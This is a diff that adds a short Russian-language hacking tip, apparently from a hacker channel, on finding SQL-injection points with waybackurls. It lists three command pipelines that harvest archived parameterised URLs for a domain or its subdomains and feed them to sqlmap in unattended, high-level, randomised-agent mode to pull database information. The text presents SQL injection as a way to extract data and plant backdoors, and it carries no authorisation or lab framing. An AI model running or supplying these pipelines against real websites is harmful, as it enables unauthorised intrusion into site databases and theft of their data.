@@ -1,0 +1,20 @@
+Методология поиска SQLi-поинтов с waybackurls 💳
+
+SQL-инъекции позволяют извлекать данные, устанавливать sql-shell, редактировать БД и загружать бэкдоры.
+
+Методика:
+
+Для одного домена:
+
+echo "https://example.com" | waybackurls | grep -E '.php|.asp|.jsp' | grep '=' | urldedupe | tee vulns.txt;  
+sqlmap -m vulns.txt --batch --random-agent --current-db --level 5 --risk 2
+
+С использованием gf sqli:
+
+echo "https://example.com" | waybackurls | urldedupe | gf sqli > vulns.txt;  
+sqlmap -m vulns.txt --batch --random-agent --current-db --level 5 --risk 2
+
+Поиск по сабдоменам:
+
+subfinder -d example.com -all -silent | waybackurls | urldedupe | gf sqli > vulns.txt;  
+sqlmap -m vulns.txt --batch --random-agent --current-db --level 5 --risk 2
